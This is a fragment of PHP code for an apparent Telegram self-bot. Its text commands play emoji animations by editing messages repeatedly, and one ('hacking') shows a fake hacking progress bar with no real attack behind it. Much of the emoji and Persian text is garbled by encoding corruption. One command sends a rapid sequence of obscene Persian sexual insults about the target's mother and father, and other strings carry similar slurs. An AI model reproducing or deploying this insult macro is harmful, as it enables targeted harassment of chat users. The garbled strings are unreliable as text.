                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐คค๐๐๐
๐๐๐ฅ๐๐๐
๐๐๐๐ฅ๐๐
๐๐๐๐๐๐
๐๐๐๐๐๐
๐ฉ๐ฉ๐ฉ๐ฉ
๐ฉ๐๐ฉ๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐คซ๐๐ฉ๐
๐ฉ๐๐ฉ๐๐ฅ๐ฅ
๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ
๐ฉ๐๐ฉ๐๐ฉ๐
๐๐ฉ๐๐๐ฉ๐ฉ
๐คค๐ฉ๐คค๐ฉ๐คค๐ฉ
๐ฉ๐๐ฉ๐๐๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐๐ฅ๐๐ฅ
๐ฉ๐๐ฅ๐๐ฅ๐
๐๐๐ฅ๐ฉ๐ฉ๐ฅ
๐๐๐ฅ๐ฉ๐ฅ๐
๐ฉ๐ฅ๐๐๐ฉ๐
๐ฉ๐๐ฅ๐๐ฅ๐
๐ฉ๐๐ฅ๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐๐ฅ๐๐
๐ฉ๐๐ฅ๐๐ฉ๐
๐ฉ๐๐ฅ๐๐ฅ๐
๐ฉ๐๐ฅ๐๐ฉ๐
๐ฉ๐๐ฅ๐๐๐
๐ฉ๐๐ฅ๐๐๐
๐ฉ๐๐ฅ๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '|ููุด ุชู ฺฉุต ููู ุจุฏุฎูุงู๐๐|']);

                    }

                    if ($text == 'ูฺฉุนุจ' or $text == 'mr1') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅโฌ๏ธ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
โฌ๏ธ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐จ๐จ๐จ๐จ๐จ๐ฅ
๐ฅ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐๐๐๐๐๐ฅ
๐ฅ๐๐๐๐๐๐ฅ
๐ฅโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธ๐ฅ
๐ฅ๐๐๐๐๐๐ฅ
๐ฅ๐ค๐ค๐ค๐ค๐ค๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโซ๏ธโผ๏ธโซ๏ธโผ๏ธโซ๏ธ๐ฅ
๐ฅโผ๏ธโซ๏ธโผ๏ธโซ๏ธโผ๏ธ๐ฅ
๐ฅโฝ๏ธโผ๏ธโฝ๏ธโผ๏ธโฝ๏ธ๐ฅ
๐ฅโผ๏ธโฝ๏ธโผ๏ธโฝ๏ธโผ๏ธ๐ฅ
๐ฅโฝ๏ธโผ๏ธโฝ๏ธโผ๏ธโฝ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ถ๐ท๐ถ๐ท๐ถ๐ฅ
๐ฅ๐ท๐ถ๐ท๐ถ๐ท๐ฅ
๐ฅ๐ถ๐ท๐ถ๐ท๐ถ๐ฅ
๐ฅ๐ท๐ถ๐ท๐ถ๐ท๐ฅ
๐ฅ๐ถ๐ท๐ถ๐ท๐ถ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโฅ๏ธโค๏ธโฅ๏ธโค๏ธโฅ๏ธ๐ฅ
๐ฅโค๏ธโฅ๏ธโค๏ธโฅ๏ธโค๏ธ๐ฅ
๐ฅโฅ๏ธโค๏ธโฅ๏ธโค๏ธโฅ๏ธ๐ฅ
๐ฅโค๏ธโฅ๏ธโค๏ธโฅ๏ธโค๏ธ๐ฅ
๐ฅโฅ๏ธโค๏ธโฅ๏ธโค๏ธโฅ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โ๏ธEnD โ๏ธ']);
                    }

                    if ($text == 'ูุฑุจุน' or $text == 'mr') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅโฌ๏ธ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
โฌ๏ธ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐จ๐จ๐จ๐จ๐จ๐ฅ
๐ฅ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฅ
๐ฅโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐๐๐๐๐๐ฅ
๐ฅ๐๐๐๐๐๐ฅ
๐ฅโค๏ธโค๏ธโค๏ธโค๏ธโค๏ธ๐ฅ
๐ฅ๐๐๐๐๐๐ฅ
๐ฅ๐ค๐ค๐ค๐ค๐ค๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโซ๏ธโผ๏ธโซ๏ธโผ๏ธโซ๏ธ๐ฅ
๐ฅโผ๏ธโซ๏ธโผ๏ธโซ๏ธโผ๏ธ๐ฅ
๐ฅโฝ๏ธโผ๏ธโฝ๏ธโผ๏ธโฝ๏ธ๐ฅ
๐ฅโผ๏ธโฝ๏ธโผ๏ธโฝ๏ธโผ๏ธ๐ฅ
๐ฅโฝ๏ธโผ๏ธโฝ๏ธโผ๏ธโฝ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ถ๐ท๐ถ๐ท๐ถ๐ฅ
๐ฅ๐ท๐ถ๐ท๐ถ๐ท๐ฅ
๐ฅ๐ถ๐ท๐ถ๐ท๐ถ๐ฅ
๐ฅ๐ท๐ถ๐ท๐ถ๐ท๐ฅ
๐ฅ๐ถ๐ท๐ถ๐ท๐ถ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโฅ๏ธโค๏ธโฅ๏ธโค๏ธโฅ๏ธ๐ฅ
๐ฅโค๏ธโฅ๏ธโค๏ธโฅ๏ธโค๏ธ๐ฅ
๐ฅโฅ๏ธโค๏ธโฅ๏ธโค๏ธโฅ๏ธ๐ฅ
๐ฅโค๏ธโฅ๏ธโค๏ธโฅ๏ธโค๏ธ๐ฅ
๐ฅโฅ๏ธโค๏ธโฅ๏ธโค๏ธโฅ๏ธ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '|ุชููููููููููููููููุงููููููููููููููุงู|']);

                    }
                    if ($text == 'coder' or $text == 'creator' or $text == 'ุณุงุฒูุฏู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " ๐ ัฮฑwฮทCรธรeฦฆ ๐"]);
                    }
                    if ($text == 'emam' or $text == 'ูุฑฺฏ ุจุฑ ุงูุฑ?ฺฉุง') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โฃฟโฃฟโฃฟโฃฟโฃฟโกฟโ โ โ โ โ โ โ โ ฉโขฟโฃฟโฃฟโฃฟโฃฟโฃฟ
โฃฟโฃฟโฃฟโฃฟโ โ โ โ โ โ โ โ โ โ โ โ ปโฃฟโฃฟโฃฟโฃฟ
โฃฟโฃฟโฃฟโฃฟโ โ โฃโฃคโฃคโฃคโฃโกโ โ โ โ โ โฃฟโฃฟโฃฟ
โฃฟโฃฟโฃฟโฃฟโกโขฐโฃฟโฃฟโฃฟโฃฟโฃฟโขฟโ โ โ โ โ โ นโขฟโฃฟ
โฃฟโฃฟโฃฟโฃฟโฃฟโกโ ปโ ฟโ โ โ โ โฃคโกโ โ โ โ โ โ 
โฃฟโฃฟโฃฟโฃฟโฃฟโฃฟโฃถโขผโฃทโกคโฃฆโฃฟโ โกฐโขโ โ โ โ โขธ
โฃฟโฃฟโฃฟโฃฟโฃฟโฃฟโฃฟโกฏโขโ ฟโขพโกฟโฃธโฃฟโ ฐโ โขโ โ โกฌ
โฃฟโฃฟโฃฟโฃฟโฃฟโฃฟโฃฟโฃดโฃดโฃโฃพโฃฟโฃฟโกงโ ฆโกถโ โ โ  โขด
โฃฟโฃฟโฃฟโฃฟโ ฟโ โฃฟโฃฟโฃฟโฃฟโฃฟโฃฟโฃฟโขโ โ โ โ โ โ 
โ โ โ โ โ โ โกฝโฃฟโฃฟโฃฟโฃฟโฃฟโฃฏโ โ โ โ โ โ โ 
โ โ โ โขโฃพโฃพโฃฟโฃคโฃฏโฃฟโฃฟโกฟโ โ โ โ โ โ โ  ']);
                    }
                    if ($text == 'ูฺฉ ฺฉุฑุฏู' or $text == 'hacking') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุชุงุฑฺฏุช ูุดุฎุต ุดุฏ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฏุฑุญุงู ุงุฌุฑุง? ุงุณฺฉุฑ?ูพุช ูฺฉ ฺฉุฑุฏู!']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุงุณฺฉุฑ?ูพุช ูฺฉ ฺฉุฑุฏู ุงุฌุฑุง ุดุฏ ุ ุฏุฑุญุงู ูฺฉ ฺฉุฑุฏู!']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '10%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '26%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '47%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '59%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '66%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '78%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '83%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '92%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '97%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '100%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '๐ป ุชุงุฑฺฏุช ูฺฉ ุดุฏ ๐ฑ']);
                    }
                    if ($text == 'ฺุฑุฎุด' or $text == 'charkhesh') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐จ๐จ๐จ๐จ๐จ
๐จ๐จ๐จ๐จ๐จ
๐จโซโซโซ๐จ
๐จ๐จ๐จ๐จ๐จ
๐จ๐จ๐จ๐จ๐จ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ
๐ฉโซ๐ฉ๐ฉ๐ฉ
๐ฉ๐ฉโซ๐ฉ๐ฉ
๐ฉ๐ฉ๐ฉโซ๐ฉ
๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง
๐งโซโซโซ๐ง
๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆโซ๐ฆ
๐ฆ๐ฆโซ๐ฆ๐ฆ
๐ฆโซ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ช๐ช๐ช๐ช
๐ช๐ชโซ๐ช๐ช
๐ช๐ชโซ๐ช๐ช
๐ช๐ชโซ๐ช๐ช
๐ช๐ช๐ช๐ช๐ช']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ซ๐ซ๐ซ๐ซ๐ซ
๐ซโซ๐ซ๐ซ๐ซ
๐ซ๐ซโซ๐ซ๐ซ
๐ซ๐ซ๐ซโซ๐ซ
๐ซ๐ซ๐ซ๐ซ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โปโปโปโปโป
โปโปโปโปโป
โปโพโพโพโป
โปโปโปโปโป
โปโปโปโปโป']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅโซโซโซ๐ฅ
๐ฅ๐ฅโซ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅโซ
๐ฅ๐ฅโซโซ๐ฅ
๐ฅโซโซโซ๐ฅ
๐ฅโซโซ๐ฅ๐ฅ
โซ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โซโซโซโซโซ
๐ฅ๐ฅโซโซ๐ฅ
๐ฅโซโซโซ๐ฅ
๐ฅโซโซ๐ฅ๐ฅ
โซโซโซโซโซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โซโซโซโซโซ
โซโซโซโซโซ
โซโซโซโซโซ
โซโซโซโซโซ
โซโซโซโซโซ']);
                    }
                    if ($text == 'ุณุงุนุช' or $text == 'clock') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐
๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฐโฐโฐโฐโฐ']);
                    }

                    if ($text == 'ุจฺฉูุด' or $text == 'ฺฉููุด ุจุฒุงุฑ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ูพุงูู ฺฉุฏุฑ ฺฏุง??ุฏุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ูุงุถูุงุจ ุดูุงู ุดุฑู ุชูุฑุงู ุชู ฺฉุต ููุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉ?ุฑ ฺฏุฑุงุฒ ูุญุด? ุชู ูุงุฏุฑุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุงููุฌุง ฺฉู ุดุงุนุฑ ู?ฺฏู ?ู ฺฉ?ุฑ ุฏุงุฑู ุดุงู ูุฏุงุฑู ุชู ููุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ูพุง?ู ุชุฎุชู ุชู ฺฉููุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉูุง ฺฉุต ููุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุงูฺฉ? ุจ? ุฏู?ู ฺฉุต ููุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุจุงุจุงุช ฺู ูุฑู?ู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุฏุณุช ุฒุฏู ุจู ฺฉูู ุจุงุจุงุช ุฏูู ุฑูุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุจู ุจุงุจุงุช ุจฺฏู ุณู?ุฏ ฺฉูู ุดุจ ู?ุงู ุจฺฉูู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉุต ููุชุ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุง?ู?ู ุนูุชู ูุทู ฺฉู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉูููุฏู ุฎููู ุง? ฺฉู ุนูุช ุชูุด ูพูู ุฏุฑู?ุงุฑู ููุดุชู ุฑู ฺฉ?ุฑู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉุต ููุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉุต ูพุฏุฑุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '?ู ูุฑุฒูุฏ ุฌุฏ?ุฏ ุฏุงุฑ? ูพุงูู ฺฉุฏุฑ']);
                    }
                    if ($text == 'ูุงฺฉ' or $text == 'fuck') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐๐ฟ๐๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐ฟ๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐ฟ๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐ฟ๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐ฟ๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐๐ฟ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐ฟ๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐ฟ๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐ฟ๐๐๐']);
